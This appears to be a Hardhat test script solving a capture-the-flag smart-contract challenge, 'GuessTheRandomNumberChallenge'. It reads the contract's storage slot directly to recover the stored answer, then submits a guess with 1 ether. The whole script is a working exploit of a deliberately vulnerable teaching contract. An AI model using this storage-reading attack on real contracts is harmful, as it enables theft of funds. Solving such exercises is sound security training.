import crypto from "crypto";
import { ethers } from "hardhat";
import { BigNumber, Contract, Signer } from "ethers";

let accounts: Signer[];
let eoa: Signer;
let contract: Contract;

before(async () => {
  accounts = await ethers.getSigners();
  eoa = accounts[0];
  const factory = await ethers.getContractFactory("GuessTheRandomNumberChallenge");
  contract = factory.attach(`0x5A1E32CadbC089c3Fd70bE72DBb244dF71670EA3`);
});

it("Attack", async function () {
  const answer = BigNumber.from(await contract.provider.getStorageAt(contract.address, 0))

  const tx = await contract.guess(answer, {
    value: ethers.utils.parseEther(`1`),
  });
  const txHash = tx && tx.hash;
  console.log(`Transaction: ${txHash}`);
});
